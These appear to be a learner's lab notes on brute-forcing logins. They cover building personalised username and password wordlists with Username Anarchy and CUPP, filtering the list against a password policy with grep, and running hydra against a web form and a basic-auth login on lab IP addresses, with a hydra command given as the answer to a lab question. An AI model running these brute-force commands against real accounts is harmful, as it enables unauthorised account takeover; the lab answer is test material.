
### Username Anarchy
```go
sudo apt install ruby -y

git clone https://github.com/urbanadventurer/username-anarchy.git

cd username-anarchy
```

Generate username variations
```go
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### CUPP - Common User Password Profiler
>[!info] 
> a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target

```go
sudo apt install cupp -y
```

Generate a password list via...
![[Pasted image 20260617175949.png]]


### If password policy has the following....

```go
- Minimum Length: 6 characters
- Must Include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)
```

...then use the following to filter the password list
```go
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Use the new filtered password list with hydra
```go
hydra -L jane_smith_usernames.txt -P jane-filtered.txt 154.57.164.76 -s 31242 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

# Questions

##### Question 1:  What is the password for the basic auth login?

Answer

```go
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.71 http-get / -s 31257
```